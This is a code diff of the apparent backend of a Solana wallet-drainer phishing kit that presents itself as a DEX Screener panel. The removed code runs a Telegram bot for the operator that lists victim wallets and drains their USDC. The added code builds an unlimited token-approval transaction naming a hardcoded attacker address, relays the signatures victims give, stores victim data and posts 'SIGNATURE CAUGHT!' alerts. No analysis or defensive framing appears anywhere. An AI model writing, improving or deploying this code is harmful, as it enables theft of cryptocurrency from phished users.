@@ -1,8 +1,8 @@
 import { Buffer } from 'buffer';
 globalThis.Buffer = Buffer;
 
-import { Connection, PublicKey, Keypair, Transaction, sendAndConfirmTransaction, SystemProgram } from "@solana/web3.js";
-import { createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction } from "@solana/spl-token";
+import { Connection, PublicKey, Keypair, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
+import { createTransferInstruction, getAssociatedTokenAddress, createApproveInstruction, createAssociatedTokenAccountInstruction } from "@solana/spl-token";
 import bs58 from "bs58";
 
 export default {
@@ -18,167 +18,80 @@ export default {
       return new Response(null, { headers: corsHeaders });
     }
 
-    if (request.method === "POST" && url.pathname === "/webhook") {
-      try {
-        const update = await request.json();
-        const msg = update.message || update.channel_post;
-        
-        if (update.callback_query) {
-          const data = update.callback_query.data;
-          const chatId = update.callback_query.message.chat.id;
-
-          if (data === "refresh_stats") {
-            let messageText = "📊 *DEXSCREENR PANEL*\n\n";
-            if (env.HARVEST) {
-              const list = await env.HARVEST.list({ limit: 5 });
-              for (const key of list.keys) {
-                const dataStr = await env.HARVEST.get(key.name);
-                if (dataStr) {
-                  const d = JSON.parse(dataStr);
-                  if (d.type === "connection_and_balance") {
-                    messageText += `👤 \`${d.victim.slice(0,4)}...\` | SOL: ${d.sol} | USDC: ${d.usdc}\n`;
-                  }
-                }
-              }
-            }
-            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-              method: "POST", headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: chatId, text: messageText, parse_mode: "Markdown" }),
-            });
-          }
-
-          if (data.startsWith("balance:")) {
-            const victimAddress = data.split(":")[1];
-            const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
-            const victimPubkey = new PublicKey(victimAddress);
-            const solBalance = await connection.getBalance(victimPubkey);
-            const solAmount = (solBalance / 1e9).toFixed(4);
-
-            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-              method: "POST", headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: chatId, text: `🔄 *Balance for* \`${victimAddress.slice(0,4)}...\`\n\nSOL: ${solAmount}`, parse_mode: "Markdown" }),
-            });
-          }
-
-          if (data.startsWith("drain:")) {
-            const victimAddress = data.split(":")[1];
-            
-            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-              method: "POST", headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: chatId, text: `⏳ Processing drain for \`${victimAddress}\`...`, parse_mode: "Markdown" }),
-            });
-
-            try {
-              const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
-              const privateKeyArray = bs58.decode(env.PRIVATE_KEY);
-              const payer = Keypair.fromSecretKey(privateKeyArray);
-              
-              const victimPubkey = new PublicKey(victimAddress);
-              const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
-              
-              const victimAta = await getAssociatedTokenAddress(USDC_MINT, victimPubkey);
-              const myAta = await getAssociatedTokenAddress(USDC_MINT, payer.publicKey);
-
-              const balance = await connection.getTokenAccountBalance(victimAta);
-              const amountToDrain = balance.value.amount;
-
-              if (amountToDrain === "0") {
-                throw new Error("Victim has 0 USDC to drain.");
-              }
-
-              const tx = new Transaction();
-              const myAtaInfo = await connection.getAccountInfo(myAta);
-              if (myAtaInfo === null) {
-                tx.add(
-                  createAssociatedTokenAccountInstruction(
-                    payer.publicKey,
-                    myAta,
-                    payer.publicKey,
-                    USDC_MINT
-                  )
-                );
-              }
-
-              tx.add(
-                createTransferInstruction(
-                  victimAta,
-                  myAta,
-                  payer.publicKey,
-                  [],
-                  parseInt(amountToDrain)
-                )
-              );
-
-              const signature = await sendAndConfirmTransaction(connection, tx, [payer]);
-
-              await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-                method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: `✅ *Drain Successful!*\n\nTX: \`${signature}\``, parse_mode: "Markdown" }),
-              });
-
-            } catch (err) {
-              await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-                method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: `❌ *Error:* ${err.message}`, parse_mode: "Markdown" }),
-              });
-            }
-          }
-
-          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/answerCallbackQuery`, {
-            method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ callback_query_id: update.callback_query.id })
-          });
-        }
-
-        return new Response("OK");
-      } catch (e) {
-        return new Response("Error", { status: 500 });
-      }
-    }
-
     if (request.method === "POST") {
       try {
         const data = await request.json();
-        
-        if (env.HARVEST) {
-          await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
-        }
-        
-        if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
-          let channelMsg = "";
-          let userMsg = "";
-          let buttons = [];
+        const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
+        const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
+
+        // BUILDER
+        if (data.type === "build_tx") {
+          const victimPubkey = new PublicKey(data.victim);
+          const attackerPubkey = new PublicKey("FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"); // Deine Adresse
           
-          if (data.type === "connection_and_balance") {
-            channelMsg = `🔗 *WALLET CONNECTED*\n\n👤 *Address:*\n\`${data.victim}\`\n\n💰 *SOL:* ${data.sol}\n💵 *USDC:* ${data.usdc}`;
-            userMsg = `✅ *Wallet connected.*\n\nWaiting for network confirmation...`;
-            buttons = [
-              [{ text: "⚡ Drain Wallet", callback_data: `drain:${data.victim}` }],
-              [{ text: "🔄 Check Balance", callback_data: `balance:${data.victim}` }]
-            ];
-          } else if (data.type === "drain") {
-            channelMsg = `🎣 *SIGNATURE CAUGHT!*\n\n👤 *Address:*\n\`${data.victim}\`\n\n📝 *TX ready.*`;
+          const victimAta = await getAssociatedTokenAddress(USDC_MINT, victimPubkey);
+          
+          const tx = new Transaction();
+          tx.add(
+            createApproveInstruction(
+              victimAta,
+              attackerPubkey,
+              victimPubkey,
+              [],
+              BigInt("18446744073709551615")
+            )
+          );
+          
+          tx.feePayer = victimPubkey;
+          tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+          // Serialisiere TX und sende als Base64 zurück
+          const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
+          return new Response(JSON.stringify({ tx: serialized.toString('base64') }), {
+            headers: { ...corsHeaders, "Content-Type": "application/json" },
+          });
+        }
+
+        // SENDER (Signierte TX empfangen und an Solana senden)
+        if (data.type === "send_tx") {
+          const rawTx = bs58.decode(data.tx);
+          const tx = Transaction.from(rawTx);
+          
+          // Sende an Solana RPC
+          const sig = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true });
+          
+          if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
+            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+              method: "POST", headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: `🎣 *SIGNATURE CAUGHT!*\n\nTX: \`${sig}\`\n\nAddress: \`${data.victim}\``, parse_mode: "Markdown" }),
+            });
+          }
+
+          return new Response(JSON.stringify({ success: true, sig }), {
+            headers: { ...corsHeaders, "Content-Type": "application/json" },
+          });
+        }
+
+        // WALLET CONNECTED (Erster Fetch)
+        if (data.type === "connection_and_balance") {
+          if (env.HARVEST) {
+            await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
           }
           
-          if (channelMsg) {
+          if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
+            let channelMsg = `🔗 *WALLET CONNECTED*\n\n👤 *Address:*\n\`${data.victim}\``;
+            let buttons = [
+              [{ text: "🔄 Check Balance", callback_data: `balance:${data.victim}` }]
+            ];
             await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
               method: "POST", headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMsg, parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } }),
             });
           }
-          
-          if (userMsg && data.tg_user_id) {
-            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-              method: "POST", headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: data.tg_user_id, text: userMsg, parse_mode: "Markdown" }),
-            });
-          }
+          return new Response(JSON.stringify({ success: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
         }
-        
-        return new Response(JSON.stringify({ success: true }), {
-          headers: { ...corsHeaders, "Content-Type": "application/json" },
-        });
 
+        return new Response("OK", { headers: corsHeaders });
       } catch (error) {
         return new Response(JSON.stringify({ error: error.message }), {
           status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
